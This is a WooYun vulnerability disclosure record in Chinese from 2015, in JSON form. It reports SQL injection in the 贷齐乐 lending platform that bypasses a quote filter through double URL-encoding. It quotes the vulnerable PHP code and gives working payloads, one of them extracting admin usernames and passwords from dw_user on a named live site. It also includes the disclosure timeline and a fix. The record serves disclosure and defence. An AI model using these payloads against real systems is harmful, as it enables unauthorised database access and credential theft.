{"id": 71226, "wybug_id": "wooyun-2015-0135702", "wybug_title": "贷齐乐系统绕过过滤继续注射(官方案例测试)", "wybug_corp": "chinaanhe.com", "wybug_author": "loopx9", "wybug_date": "2015-08-24 14:50", "wybug_open_date": "2015-11-22 17:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向公众公开  简要描述： 对sql注入漏洞修复不当，只是简单地作了参数过滤。 详细说明：  在 WooYun: 贷齐乐系统多处SQL注入漏洞可影响到敏感数据(续) 提到两个urldecode的注入，影响到新版的系统，后来官方过滤了参数中的单引号。由于是urldecode导致的注入，进行url双编码就能绕过注入过滤。\n$request_uri = explode(\"?\", $_SERVER['REQUEST_URI']);if (isset($request_uri[1])) {\t$rewrite_url = explode(\"&\", $request_uri[1]);\tforeach ($rewrite_url as $key => $value) {\t\t$_value = explode(\"=\", $value);\t\tif (isset($_value[1])) {\t\t    $_REQUEST[$_value[0]] = addslashes(dhtmlspecialchars($_value[1]));\t\t}\t}}\n如果是GET方式传入参数会直接从$_SERVER['REQUEST_URI']提取并覆盖，所以注入参数改为POST方式，就不会被覆盖了。modules\\member\\index_ruizhict.php:\n# 检查邮箱是否被注册\telseif ($_U['query_class'] == 'check_email'){\t\t$email = urldecode($_REQUEST['email']);\t\t$sql = \"select * from {user} where email='{$email}'\";\t\t$result = $mysql->db_fetch_array($sql);\t\t\tif ($result == false){\t\t\techo true;exit;\t\t}else{\t\t\techo false;exit;\t\t}\t}\nemail参数存在注入.利用方式:请求url: \n/index.php?user&q=action/check_emailpost data: email=%2527 or 1=1#\n第2个注入:(需要登录)modules\\user\\user.inc.php: \n//加为好友\telseif ($_U['query_type'] == \"addfriend\"){\t\tif (isset($_POST['type'])){\t\t\t$data['type'] = $_POST['type'];\t\t\t$data['content'] = nl2br($_POST['content']);\t\t\t$data['friends_userid'] = $_POST['friends_userid'];\t\t\t$data['user_id'] = $_G['user_id'];\t\t\t$result = userClass::AddFriends($data);\t\t\tif ($result==false){\t\t\t\t$msg = array($result,\"\",\"/index.php?user&q=code/user/myfriend\");\t\t\t\t}else{\t\t\t\t$msg = array(\"添加好友成功，请等待好友的审核\",\"\",\"/index.php?user&q=code/user/myfriend\");\t\t\t\t}\t\t}else{\t\t\t\t$result = userClass::GetOnes(array(\"username\"=>$_REQUEST['username']));\t\t\tif ($result==false){\t\t\t\t$result = userClass::GetOnes(array(\"username\"=>urldecode($_REQUEST['username'])));\t\t\t\t$_REQUEST['username'] = urldecode($_REQUEST['username']);\t\t\t}\t\t\tif ($result==false){\t\t\t\techo \"<script>alert('找不到此用户，请不要乱操作');location.href='/index.php?user'</script>\";\t\t\t\texit;\t\t\t}elseif ($result['user_id']==$_G['user_id']){\t\t\t\techo \"<script>alert('不能加自己为好友');location.href='/index.php?user';</script>\";\t\t\t\texit;\t\t\t}else{\nusername参数存在注入.利用方式:请求url:\n/index.php?user&q=code/user/addfriendpost data: username=%2527uni%256Fn%20sel%2565ct%20user%2528%2529,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53#\n   漏洞证明：  使用官网提供的案例: www.6scf.com\nhttp://www.6scf.com/index.php?user&q=action/check_emailpost: email=%2527 or 1=1#\n可以盲注:\n\n第2个注入:登录后访问:\nhttp://www.6scf.com/index.php?user&q=code/user/addfriendpost data: username=%2527uni%256Fn%20sel%2565ct%20c%256Fncat%2528username,0x3a,password%2529,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53%20fr%256Fm%20dw_user%20limit%201%23\n可以直接查询管理员密码: select concat(username,0x3a,password) from dw_user limit 1查看源代码:\n\n   修复方案：  排查urldecode函数使用，最好在urldecode之后再addslashes一下.   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-08-24 17:26 厂商回复： 谢谢测试 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-11-22 21:33 |    \t\t心云 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:23        | 遇见)\t\t \n   围观    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}